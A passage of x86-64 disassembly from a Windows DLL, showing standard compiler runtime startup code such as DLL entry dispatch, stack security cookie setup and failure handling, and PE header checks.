   180002632:	49 8b ce             	mov    %r14,%rcx
   180002635:	e8 42 03 00 00       	call   0x18000297c
   18000263a:	8b d8                	mov    %eax,%ebx
   18000263c:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180002640:	83 ff 01             	cmp    $0x1,%edi
   180002643:	75 36                	jne    0x18000267b
   180002645:	85 c0                	test   %eax,%eax
   180002647:	75 32                	jne    0x18000267b
   180002649:	4c 8b c6             	mov    %rsi,%r8
   18000264c:	33 d2                	xor    %edx,%edx
   18000264e:	49 8b ce             	mov    %r14,%rcx
   180002651:	e8 26 03 00 00       	call   0x18000297c
   180002656:	48 85 f6             	test   %rsi,%rsi
   180002659:	0f 95 c1             	setne  %cl
   18000265c:	e8 cf fe ff ff       	call   0x180002530
   180002661:	48 8b 05 a8 1b 00 00 	mov    0x1ba8(%rip),%rax        # 0x180004210
   180002668:	48 85 c0             	test   %rax,%rax
   18000266b:	74 0e                	je     0x18000267b
   18000266d:	4c 8b c6             	mov    %rsi,%r8
   180002670:	33 d2                	xor    %edx,%edx
   180002672:	49 8b ce             	mov    %r14,%rcx
   180002675:	ff 15 2d 1b 00 00    	call   *0x1b2d(%rip)        # 0x1800041a8
   18000267b:	85 ff                	test   %edi,%edi
   18000267d:	74 05                	je     0x180002684
   18000267f:	83 ff 03             	cmp    $0x3,%edi
   180002682:	75 3c                	jne    0x1800026c0
   180002684:	4c 8b c6             	mov    %rsi,%r8
   180002687:	8b d7                	mov    %edi,%edx
   180002689:	49 8b ce             	mov    %r14,%rcx
   18000268c:	e8 37 fd ff ff       	call   0x1800023c8
   180002691:	8b d8                	mov    %eax,%ebx
   180002693:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180002697:	85 c0                	test   %eax,%eax
   180002699:	74 25                	je     0x1800026c0
   18000269b:	48 8b 05 6e 1b 00 00 	mov    0x1b6e(%rip),%rax        # 0x180004210
   1800026a2:	48 85 c0             	test   %rax,%rax
   1800026a5:	75 05                	jne    0x1800026ac
   1800026a7:	8d 58 01             	lea    0x1(%rax),%ebx
   1800026aa:	eb 10                	jmp    0x1800026bc
   1800026ac:	4c 8b c6             	mov    %rsi,%r8
   1800026af:	8b d7                	mov    %edi,%edx
   1800026b1:	49 8b ce             	mov    %r14,%rcx
   1800026b4:	ff 15 ee 1a 00 00    	call   *0x1aee(%rip)        # 0x1800041a8
   1800026ba:	8b d8                	mov    %eax,%ebx
   1800026bc:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   1800026c0:	eb 06                	jmp    0x1800026c8
   1800026c2:	33 db                	xor    %ebx,%ebx
   1800026c4:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   1800026c8:	8b c3                	mov    %ebx,%eax
   1800026ca:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   1800026cf:	48 83 c4 40          	add    $0x40,%rsp
   1800026d3:	41 5e                	pop    %r14
   1800026d5:	5f                   	pop    %rdi
   1800026d6:	5e                   	pop    %rsi
   1800026d7:	c3                   	ret
   1800026d8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800026dd:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800026e2:	57                   	push   %rdi
   1800026e3:	48 83 ec 20          	sub    $0x20,%rsp
   1800026e7:	49 8b f8             	mov    %r8,%rdi
   1800026ea:	8b da                	mov    %edx,%ebx
   1800026ec:	48 8b f1             	mov    %rcx,%rsi
   1800026ef:	83 fa 01             	cmp    $0x1,%edx
   1800026f2:	75 05                	jne    0x1800026f9
   1800026f4:	e8 d7 01 00 00       	call   0x1800028d0
   1800026f9:	4c 8b c7             	mov    %rdi,%r8
   1800026fc:	8b d3                	mov    %ebx,%edx
   1800026fe:	48 8b ce             	mov    %rsi,%rcx
   180002701:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002706:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   18000270b:	48 83 c4 20          	add    $0x20,%rsp
   18000270f:	5f                   	pop    %rdi
   180002710:	e9 9b fe ff ff       	jmp    0x1800025b0
   180002715:	cc                   	int3
   180002716:	cc                   	int3
   180002717:	cc                   	int3
   180002718:	40 53                	rex push %rbx
   18000271a:	48 83 ec 20          	sub    $0x20,%rsp
   18000271e:	48 8b d9             	mov    %rcx,%rbx
   180002721:	33 c9                	xor    %ecx,%ecx
   180002723:	ff 15 17 19 00 00    	call   *0x1917(%rip)        # 0x180004040
   180002729:	48 8b cb             	mov    %rbx,%rcx
   18000272c:	ff 15 06 19 00 00    	call   *0x1906(%rip)        # 0x180004038
   180002732:	ff 15 c8 18 00 00    	call   *0x18c8(%rip)        # 0x180004000
   180002738:	48 8b c8             	mov    %rax,%rcx
   18000273b:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   180002740:	48 83 c4 20          	add    $0x20,%rsp
   180002744:	5b                   	pop    %rbx
   180002745:	48 ff 25 fc 18 00 00 	rex.W jmp *0x18fc(%rip)        # 0x180004048
   18000274c:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   180002751:	48 83 ec 38          	sub    $0x38,%rsp
   180002755:	b9 17 00 00 00       	mov    $0x17,%ecx
   18000275a:	ff 15 f0 18 00 00    	call   *0x18f0(%rip)        # 0x180004050
   180002760:	85 c0                	test   %eax,%eax
   180002762:	74 07                	je     0x18000276b
   180002764:	b9 02 00 00 00       	mov    $0x2,%ecx
   180002769:	cd 29                	int    $0x29
   18000276b:	48 8d 0d 4e 3b 00 00 	lea    0x3b4e(%rip),%rcx        # 0x1800062c0
   180002772:	e8 a9 00 00 00       	call   0x180002820
   180002777:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   18000277c:	48 89 05 35 3c 00 00 	mov    %rax,0x3c35(%rip)        # 0x1800063b8
   180002783:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   180002788:	48 83 c0 08          	add    $0x8,%rax
   18000278c:	48 89 05 c5 3b 00 00 	mov    %rax,0x3bc5(%rip)        # 0x180006358
   180002793:	48 8b 05 1e 3c 00 00 	mov    0x3c1e(%rip),%rax        # 0x1800063b8
   18000279a:	48 89 05 8f 3a 00 00 	mov    %rax,0x3a8f(%rip)        # 0x180006230
   1800027a1:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   1800027a6:	48 89 05 93 3b 00 00 	mov    %rax,0x3b93(%rip)        # 0x180006340
   1800027ad:	c7 05 69 3a 00 00 09 	movl   $0xc0000409,0x3a69(%rip)        # 0x180006220
   1800027b4:	04 00 c0 
   1800027b7:	c7 05 63 3a 00 00 01 	movl   $0x1,0x3a63(%rip)        # 0x180006224
   1800027be:	00 00 00 
   1800027c1:	c7 05 6d 3a 00 00 01 	movl   $0x1,0x3a6d(%rip)        # 0x180006238
   1800027c8:	00 00 00 
   1800027cb:	b8 08 00 00 00       	mov    $0x8,%eax
   1800027d0:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1800027d4:	48 8d 0d 65 3a 00 00 	lea    0x3a65(%rip),%rcx        # 0x180006240
   1800027db:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   1800027e2:	00 
   1800027e3:	b8 08 00 00 00       	mov    $0x8,%eax
   1800027e8:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1800027ec:	48 8b 0d 0d 38 00 00 	mov    0x380d(%rip),%rcx        # 0x180006000
   1800027f3:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   1800027f8:	b8 08 00 00 00       	mov    $0x8,%eax
   1800027fd:	48 6b c0 01          	imul   $0x1,%rax,%rax
   180002801:	48 8b 0d 38 38 00 00 	mov    0x3838(%rip),%rcx        # 0x180006040
   180002808:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   18000280d:	48 8d 0d 04 1a 00 00 	lea    0x1a04(%rip),%rcx        # 0x180004218
   180002814:	e8 ff fe ff ff       	call   0x180002718
   180002819:	90                   	nop
   18000281a:	48 83 c4 38          	add    $0x38,%rsp
   18000281e:	c3                   	ret
   18000281f:	cc                   	int3
   180002820:	40 53                	rex push %rbx
   180002822:	56                   	push   %rsi
   180002823:	57                   	push   %rdi
   180002824:	48 83 ec 40          	sub    $0x40,%rsp
   180002828:	48 8b d9             	mov    %rcx,%rbx
   18000282b:	ff 15 5f 18 00 00    	call   *0x185f(%rip)        # 0x180004090
   180002831:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   180002838:	33 ff                	xor    %edi,%edi
   18000283a:	45 33 c0             	xor    %r8d,%r8d
   18000283d:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   180002842:	48 8b ce             	mov    %rsi,%rcx
   180002845:	ff 15 dd 17 00 00    	call   *0x17dd(%rip)        # 0x180004028
   18000284b:	48 85 c0             	test   %rax,%rax
   18000284e:	74 39                	je     0x180002889
   180002850:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   180002856:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   18000285b:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   180002860:	4c 8b c8             	mov    %rax,%r9
   180002863:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180002868:	4c 8b c6             	mov    %rsi,%r8
   18000286b:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   180002870:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   180002875:	33 c9                	xor    %ecx,%ecx
   180002877:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   18000287c:	ff 15 ae 17 00 00    	call   *0x17ae(%rip)        # 0x180004030
   180002882:	ff c7                	inc    %edi
   180002884:	83 ff 02             	cmp    $0x2,%edi
   180002887:	7c b1                	jl     0x18000283a
   180002889:	48 83 c4 40          	add    $0x40,%rsp
   18000288d:	5f                   	pop    %rdi
   18000288e:	5e                   	pop    %rsi
   18000288f:	5b                   	pop    %rbx
   180002890:	c3                   	ret
   180002891:	cc                   	int3
   180002892:	cc                   	int3
   180002893:	cc                   	int3
   180002894:	40 53                	rex push %rbx
   180002896:	48 83 ec 20          	sub    $0x20,%rsp
   18000289a:	48 8b d9             	mov    %rcx,%rbx
   18000289d:	eb 0f                	jmp    0x1800028ae
   18000289f:	48 8b cb             	mov    %rbx,%rcx
   1800028a2:	e8 1e 0b 00 00       	call   0x1800033c5
   1800028a7:	85 c0                	test   %eax,%eax
   1800028a9:	74 13                	je     0x1800028be
   1800028ab:	48 8b cb             	mov    %rbx,%rcx
   1800028ae:	e8 00 0b 00 00       	call   0x1800033b3
   1800028b3:	48 85 c0             	test   %rax,%rax
   1800028b6:	74 e7                	je     0x18000289f
   1800028b8:	48 83 c4 20          	add    $0x20,%rsp
   1800028bc:	5b                   	pop    %rbx
   1800028bd:	c3                   	ret
   1800028be:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   1800028c2:	74 06                	je     0x1800028ca
   1800028c4:	e8 53 07 00 00       	call   0x18000301c
   1800028c9:	cc                   	int3
   1800028ca:	e8 6d 07 00 00       	call   0x18000303c
   1800028cf:	cc                   	int3
   1800028d0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1800028d5:	55                   	push   %rbp
   1800028d6:	48 8b ec             	mov    %rsp,%rbp
   1800028d9:	48 83 ec 30          	sub    $0x30,%rsp
   1800028dd:	48 8b 05 1c 37 00 00 	mov    0x371c(%rip),%rax        # 0x180006000
   1800028e4:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   1800028eb:	2b 00 00 
   1800028ee:	48 3b c3             	cmp    %rbx,%rax
   1800028f1:	75 74                	jne    0x180002967
   1800028f3:	48 83 65 10 00       	andq   $0x0,0x10(%rbp)
   1800028f8:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   1800028fc:	ff 15 6e 17 00 00    	call   *0x176e(%rip)        # 0x180004070
   180002902:	48 8b 45 10          	mov    0x10(%rbp),%rax
   180002906:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   18000290a:	ff 15 58 17 00 00    	call   *0x1758(%rip)        # 0x180004068
   180002910:	8b c0                	mov    %eax,%eax
   180002912:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   180002916:	ff 15 44 17 00 00    	call   *0x1744(%rip)        # 0x180004060
   18000291c:	8b c0                	mov    %eax,%eax
   18000291e:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   180002922:	48 31 45 f0          	xor    %rax,-0x10(%rbp)
   180002926:	ff 15 2c 17 00 00    	call   *0x172c(%rip)        # 0x180004058
   18000292c:	8b 45 18             	mov    0x18(%rbp),%eax
   18000292f:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   180002933:	48 c1 e0 20          	shl    $0x20,%rax
   180002937:	48 33 45 18          	xor    0x18(%rbp),%rax
   18000293b:	48 33 45 f0          	xor    -0x10(%rbp),%rax
   18000293f:	48 33 c1             	xor    %rcx,%rax
   180002942:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   180002949:	ff 00 00 
   18000294c:	48 23 c1             	and    %rcx,%rax
   18000294f:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   180002956:	2b 00 00 
   180002959:	48 3b c3             	cmp    %rbx,%rax
   18000295c:	48 0f 44 c1          	cmove  %rcx,%rax
   180002960:	48 89 05 99 36 00 00 	mov    %rax,0x3699(%rip)        # 0x180006000
   180002967:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   18000296c:	48 f7 d0             	not    %rax
   18000296f:	48 89 05 ca 36 00 00 	mov    %rax,0x36ca(%rip)        # 0x180006040
   180002976:	48 83 c4 30          	add    $0x30,%rsp
   18000297a:	5d                   	pop    %rbp
   18000297b:	c3                   	ret
   18000297c:	48 83 ec 28          	sub    $0x28,%rsp
   180002980:	83 fa 01             	cmp    $0x1,%edx
   180002983:	75 10                	jne    0x180002995
   180002985:	48 83 3d 83 18 00 00 	cmpq   $0x0,0x1883(%rip)        # 0x180004210
   18000298c:	00 
   18000298d:	75 06                	jne    0x180002995
   18000298f:	ff 15 f3 16 00 00    	call   *0x16f3(%rip)        # 0x180004088
   180002995:	b8 01 00 00 00       	mov    $0x1,%eax
   18000299a:	48 83 c4 28          	add    $0x28,%rsp
   18000299e:	c3                   	ret
   18000299f:	cc                   	int3
   1800029a0:	48 8d 0d e9 3d 00 00 	lea    0x3de9(%rip),%rcx        # 0x180006790
   1800029a7:	48 ff 25 d2 16 00 00 	rex.W jmp *0x16d2(%rip)        # 0x180004080
   1800029ae:	cc                   	int3
   1800029af:	cc                   	int3
   1800029b0:	48 8d 0d d9 3d 00 00 	lea    0x3dd9(%rip),%rcx        # 0x180006790
   1800029b7:	e9 d3 09 00 00       	jmp    0x18000338f
   1800029bc:	48 8d 05 dd 3d 00 00 	lea    0x3ddd(%rip),%rax        # 0x1800067a0
   1800029c3:	c3                   	ret
   1800029c4:	48 8d 05 dd 3d 00 00 	lea    0x3ddd(%rip),%rax        # 0x1800067a8
   1800029cb:	c3                   	ret
   1800029cc:	48 83 ec 28          	sub    $0x28,%rsp
   1800029d0:	e8 e7 ff ff ff       	call   0x1800029bc
   1800029d5:	48 83 08 24          	orq    $0x24,(%rax)
   1800029d9:	e8 e6 ff ff ff       	call   0x1800029c4
   1800029de:	48 83 08 02          	orq    $0x2,(%rax)
   1800029e2:	48 83 c4 28          	add    $0x28,%rsp
   1800029e6:	c3                   	ret
   1800029e7:	cc                   	int3
   1800029e8:	48 83 ec 28          	sub    $0x28,%rsp
   1800029ec:	e8 53 09 00 00       	call   0x180003344
   1800029f1:	85 c0                	test   %eax,%eax
   1800029f3:	74 21                	je     0x180002a16
   1800029f5:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   1800029fc:	00 00 
   1800029fe:	48 8b 48 08          	mov    0x8(%rax),%rcx
   180002a02:	eb 05                	jmp    0x180002a09
   180002a04:	48 3b c8             	cmp    %rax,%rcx
   180002a07:	74 14                	je     0x180002a1d
   180002a09:	33 c0                	xor    %eax,%eax
   180002a0b:	f0 48 0f b1 0d a4 3d 	lock cmpxchg %rcx,0x3da4(%rip)        # 0x1800067b8
   180002a12:	00 00 
   180002a14:	75 ee                	jne    0x180002a04
   180002a16:	32 c0                	xor    %al,%al
   180002a18:	48 83 c4 28          	add    $0x28,%rsp
   180002a1c:	c3                   	ret
   180002a1d:	b0 01                	mov    $0x1,%al
   180002a1f:	eb f7                	jmp    0x180002a18
   180002a21:	cc                   	int3
   180002a22:	cc                   	int3
   180002a23:	cc                   	int3
   180002a24:	48 83 ec 28          	sub    $0x28,%rsp
   180002a28:	e8 17 09 00 00       	call   0x180003344
   180002a2d:	85 c0                	test   %eax,%eax
   180002a2f:	74 07                	je     0x180002a38
   180002a31:	e8 3a 06 00 00       	call   0x180003070
   180002a36:	eb 19                	jmp    0x180002a51
   180002a38:	e8 ff 08 00 00       	call   0x18000333c
   180002a3d:	8b c8                	mov    %eax,%ecx
   180002a3f:	e8 8d 09 00 00       	call   0x1800033d1
   180002a44:	85 c0                	test   %eax,%eax
   180002a46:	74 04                	je     0x180002a4c
   180002a48:	32 c0                	xor    %al,%al
   180002a4a:	eb 07                	jmp    0x180002a53
   180002a4c:	e8 86 09 00 00       	call   0x1800033d7
   180002a51:	b0 01                	mov    $0x1,%al
   180002a53:	48 83 c4 28          	add    $0x28,%rsp
   180002a57:	c3                   	ret
   180002a58:	48 83 ec 28          	sub    $0x28,%rsp
   180002a5c:	33 c9                	xor    %ecx,%ecx
   180002a5e:	e8 2d 01 00 00       	call   0x180002b90
   180002a63:	84 c0                	test   %al,%al
   180002a65:	0f 95 c0             	setne  %al
   180002a68:	48 83 c4 28          	add    $0x28,%rsp
   180002a6c:	c3                   	ret
   180002a6d:	cc                   	int3
   180002a6e:	cc                   	int3
   180002a6f:	cc                   	int3
   180002a70:	48 83 ec 28          	sub    $0x28,%rsp
   180002a74:	e8 77 09 00 00       	call   0x1800033f0
   180002a79:	84 c0                	test   %al,%al
   180002a7b:	75 04                	jne    0x180002a81
   180002a7d:	32 c0                	xor    %al,%al
   180002a7f:	eb 12                	jmp    0x180002a93
   180002a81:	e8 6a 09 00 00       	call   0x1800033f0
   180002a86:	84 c0                	test   %al,%al
   180002a88:	75 07                	jne    0x180002a91
   180002a8a:	e8 61 09 00 00       	call   0x1800033f0
   180002a8f:	eb ec                	jmp    0x180002a7d
   180002a91:	b0 01                	mov    $0x1,%al
   180002a93:	48 83 c4 28          	add    $0x28,%rsp
   180002a97:	c3                   	ret
   180002a98:	48 83 ec 28          	sub    $0x28,%rsp
   180002a9c:	e8 4f 09 00 00       	call   0x1800033f0
   180002aa1:	e8 4a 09 00 00       	call   0x1800033f0
   180002aa6:	b0 01                	mov    $0x1,%al
   180002aa8:	48 83 c4 28          	add    $0x28,%rsp
   180002aac:	c3                   	ret
   180002aad:	cc                   	int3
   180002aae:	cc                   	int3
   180002aaf:	cc                   	int3
   180002ab0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002ab5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180002aba:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180002abf:	57                   	push   %rdi
   180002ac0:	48 83 ec 20          	sub    $0x20,%rsp
   180002ac4:	49 8b f9             	mov    %r9,%rdi
   180002ac7:	49 8b f0             	mov    %r8,%rsi
   180002aca:	8b da                	mov    %edx,%ebx
   180002acc:	48 8b e9             	mov    %rcx,%rbp
   180002acf:	e8 70 08 00 00       	call   0x180003344
   180002ad4:	85 c0                	test   %eax,%eax
   180002ad6:	75 16                	jne    0x180002aee
   180002ad8:	83 fb 01             	cmp    $0x1,%ebx
   180002adb:	75 11                	jne    0x180002aee
   180002add:	4c 8b c6             	mov    %rsi,%r8
   180002ae0:	33 d2                	xor    %edx,%edx
   180002ae2:	48 8b cd             	mov    %rbp,%rcx
   180002ae5:	48 8b c7             	mov    %rdi,%rax
   180002ae8:	ff 15 ba 16 00 00    	call   *0x16ba(%rip)        # 0x1800041a8
   180002aee:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   180002af3:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   180002af7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002afc:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180002b01:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180002b06:	48 83 c4 20          	add    $0x20,%rsp
   180002b0a:	5f                   	pop    %rdi
   180002b0b:	e9 bb 08 00 00       	jmp    0x1800033cb
   180002b10:	48 83 ec 28          	sub    $0x28,%rsp
   180002b14:	e8 2b 08 00 00       	call   0x180003344
   180002b19:	85 c0                	test   %eax,%eax
   180002b1b:	74 10                	je     0x180002b2d
   180002b1d:	48 8d 0d a4 3c 00 00 	lea    0x3ca4(%rip),%rcx        # 0x1800067c8
   180002b24:	48 83 c4 28          	add    $0x28,%rsp
   180002b28:	e9 b6 08 00 00       	jmp    0x1800033e3
   180002b2d:	e8 c2 08 00 00       	call   0x1800033f4
   180002b32:	85 c0                	test   %eax,%eax
   180002b34:	75 05                	jne    0x180002b3b
   180002b36:	e8 ae 08 00 00       	call   0x1800033e9
   180002b3b:	48 83 c4 28          	add    $0x28,%rsp
   180002b3f:	c3                   	ret
   180002b40:	48 83 ec 28          	sub    $0x28,%rsp
   180002b44:	33 c9                	xor    %ecx,%ecx
   180002b46:	e8 a5 08 00 00       	call   0x1800033f0
   180002b4b:	48 83 c4 28          	add    $0x28,%rsp
   180002b4f:	e9 9c 08 00 00       	jmp    0x1800033f0
   180002b54:	48 83 ec 28          	sub    $0x28,%rsp
   180002b58:	85 c9                	test   %ecx,%ecx
   180002b5a:	75 07                	jne    0x180002b63
   180002b5c:	c6 05 5d 3c 00 00 01 	movb   $0x1,0x3c5d(%rip)        # 0x1800067c0
   180002b63:	e8 08 05 00 00       	call   0x180003070
   180002b68:	e8 83 08 00 00       	call   0x1800033f0
   180002b6d:	84 c0                	test   %al,%al
   180002b6f:	75 04                	jne    0x180002b75
   180002b71:	32 c0                	xor    %al,%al
   180002b73:	eb 14                	jmp    0x180002b89
   180002b75:	e8 76 08 00 00       	call   0x1800033f0
   180002b7a:	84 c0                	test   %al,%al
   180002b7c:	75 09                	jne    0x180002b87
   180002b7e:	33 c9                	xor    %ecx,%ecx
   180002b80:	e8 6b 08 00 00       	call   0x1800033f0
   180002b85:	eb ea                	jmp    0x180002b71
   180002b87:	b0 01                	mov    $0x1,%al
   180002b89:	48 83 c4 28          	add    $0x28,%rsp
   180002b8d:	c3                   	ret
   180002b8e:	cc                   	int3
   180002b8f:	cc                   	int3
   180002b90:	40 53                	rex push %rbx
   180002b92:	48 83 ec 20          	sub    $0x20,%rsp
   180002b96:	80 3d 24 3c 00 00 00 	cmpb   $0x0,0x3c24(%rip)        # 0x1800067c1
   180002b9d:	8b d9                	mov    %ecx,%ebx
   180002b9f:	75 67                	jne    0x180002c08
   180002ba1:	83 f9 01             	cmp    $0x1,%ecx
   180002ba4:	77 6a                	ja     0x180002c10
   180002ba6:	e8 99 07 00 00       	call   0x180003344
   180002bab:	85 c0                	test   %eax,%eax
   180002bad:	74 28                	je     0x180002bd7
   180002baf:	85 db                	test   %ebx,%ebx
   180002bb1:	75 24                	jne    0x180002bd7
   180002bb3:	48 8d 0d 0e 3c 00 00 	lea    0x3c0e(%rip),%rcx        # 0x1800067c8
   180002bba:	e8 1e 08 00 00       	call   0x1800033dd
   180002bbf:	85 c0                	test   %eax,%eax
   180002bc1:	75 10                	jne    0x180002bd3
   180002bc3:	48 8d 0d 16 3c 00 00 	lea    0x3c16(%rip),%rcx        # 0x1800067e0
   180002bca:	e8 0e 08 00 00       	call   0x1800033dd
   180002bcf:	85 c0                	test   %eax,%eax
   180002bd1:	74 2e                	je     0x180002c01
   180002bd3:	32 c0                	xor    %al,%al
   180002bd5:	eb 33                	jmp    0x180002c0a
   180002bd7:	66 0f 6f 05 51 16 00 	movdqa 0x1651(%rip),%xmm0        # 0x180004230
   180002bde:	00 
   180002bdf:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   180002be3:	f3 0f 7f 05 dd 3b 00 	movdqu %xmm0,0x3bdd(%rip)        # 0x1800067c8
   180002bea:	00 
   180002beb:	48 89 05 e6 3b 00 00 	mov    %rax,0x3be6(%rip)        # 0x1800067d8
   180002bf2:	f3 0f 7f 05 e6 3b 00 	movdqu %xmm0,0x3be6(%rip)        # 0x1800067e0
   180002bf9:	00 
   180002bfa:	48 89 05 ef 3b 00 00 	mov    %rax,0x3bef(%rip)        # 0x1800067f0
   180002c01:	c6 05 b9 3b 00 00 01 	movb   $0x1,0x3bb9(%rip)        # 0x1800067c1
   180002c08:	b0 01                	mov    $0x1,%al
   180002c0a:	48 83 c4 20          	add    $0x20,%rsp
   180002c0e:	5b                   	pop    %rbx
   180002c0f:	c3                   	ret
   180002c10:	b9 05 00 00 00       	mov    $0x5,%ecx
   180002c15:	e8 fa 00 00 00       	call   0x180002d14
   180002c1a:	cc                   	int3
   180002c1b:	cc                   	int3
   180002c1c:	48 83 ec 18          	sub    $0x18,%rsp
   180002c20:	4c 8b c1             	mov    %rcx,%r8
   180002c23:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   180002c28:	66 39 05 d1 d3 ff ff 	cmp    %ax,-0x2c2f(%rip)        # 0x180000000
   180002c2f:	75 78                	jne    0x180002ca9
   180002c31:	48 63 0d 04 d4 ff ff 	movslq -0x2bfc(%rip),%rcx        # 0x18000003c
   180002c38:	48 8d 15 c1 d3 ff ff 	lea    -0x2c3f(%rip),%rdx        # 0x180000000
   180002c3f:	48 03 ca             	add    %rdx,%rcx
   180002c42:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   180002c48:	75 5f                	jne    0x180002ca9
   180002c4a:	b8 0b 02 00 00       	mov    $0x20b,%eax
   180002c4f:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   180002c53:	75 54                	jne    0x180002ca9
   180002c55:	4c 2b c2             	sub    %rdx,%r8
   180002c58:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   180002c5c:	48 83 c2 18          	add    $0x18,%rdx
   180002c60:	48 03 d1             	add    %rcx,%rdx
   180002c63:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   180002c67:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   180002c6b:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   180002c6f:	48 89 14 24          	mov    %rdx,(%rsp)
   180002c73:	49 3b d1             	cmp    %r9,%rdx
   180002c76:	74 18                	je     0x180002c90
   180002c78:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   180002c7b:	4c 3b c1             	cmp    %rcx,%r8
   180002c7e:	72 0a                	jb     0x180002c8a
   180002c80:	8b 42 08             	mov    0x8(%rdx),%eax
   180002c83:	03 c1                	add    %ecx,%eax
   180002c85:	4c 3b c0             	cmp    %rax,%r8
   180002c88:	72 08                	jb     0x180002c92
   180002c8a:	48 83 c2 28          	add    $0x28,%rdx
   180002c8e:	eb df                	jmp    0x180002c6f
   180002c90:	33 d2                	xor    %edx,%edx
   180002c92:	48 85 d2             	test   %rdx,%rdx
   180002c95:	75 04                	jne    0x180002c9b
   180002c97:	32 c0                	xor    %al,%al
   180002c99:	eb 14                	jmp    0x180002caf
   180002c9b:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   180002c9f:	7d 04                	jge    0x180002ca5
   180002ca1:	32 c0                	xor    %al,%al
   180002ca3:	eb 0a                	jmp    0x180002caf
   180002ca5:	b0 01                	mov    $0x1,%al
   180002ca7:	eb 06                	jmp    0x180002caf
   180002ca9:	32 c0                	xor    %al,%al
   180002cab:	eb 02                	jmp    0x180002caf
   180002cad:	32 c0                	xor    %al,%al
   180002caf:	48 83 c4 18          	add    $0x18,%rsp
   180002cb3:	c3                   	ret
   180002cb4:	40 53                	rex push %rbx
   180002cb6:	48 83 ec 20          	sub    $0x20,%rsp
   180002cba:	8a d9                	mov    %cl,%bl
   180002cbc:	e8 83 06 00 00       	call   0x180003344
   180002cc1:	33 d2                	xor    %edx,%edx
   180002cc3:	85 c0                	test   %eax,%eax
   180002cc5:	74 0b                	je     0x180002cd2
   180002cc7:	84 db                	test   %bl,%bl
   180002cc9:	75 07                	jne    0x180002cd2
   180002ccb:	48 87 15 e6 3a 00 00 	xchg   %rdx,0x3ae6(%rip)        # 0x1800067b8
   180002cd2:	48 83 c4 20          	add    $0x20,%rsp
   180002cd6:	5b                   	pop    %rbx
   180002cd7:	c3                   	ret
   180002cd8:	40 53                	rex push %rbx
   180002cda:	48 83 ec 20          	sub    $0x20,%rsp
   180002cde:	80 3d db 3a 00 00 00 	cmpb   $0x0,0x3adb(%rip)        # 0x1800067c0
   180002ce5:	8a d9                	mov    %cl,%bl
   180002ce7:	74 04                	je     0x180002ced
   180002ce9:	84 d2                	test   %dl,%dl
   180002ceb:	75 0c                	jne    0x180002cf9
   180002ced:	e8 fe 06 00 00       	call   0x1800033f0
   180002cf2:	8a cb                	mov    %bl,%cl
   180002cf4:	e8 f7 06 00 00       	call   0x1800033f0
   180002cf9:	b0 01                	mov    $0x1,%al
   180002cfb:	48 83 c4 20          	add    $0x20,%rsp
   180002cff:	5b                   	pop    %rbx
   180002d00:	c3                   	ret
   180002d01:	cc                   	int3
   180002d02:	cc                   	int3
   180002d03:	cc                   	int3
   180002d04:	48 8d 05 95 5a 00 00 	lea    0x5a95(%rip),%rax        # 0x1800087a0
   180002d0b:	c3                   	ret
   180002d0c:	83 25 e5 3a 00 00 00 	andl   $0x0,0x3ae5(%rip)        # 0x1800067f8
   180002d13:	c3                   	ret
   180002d14:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
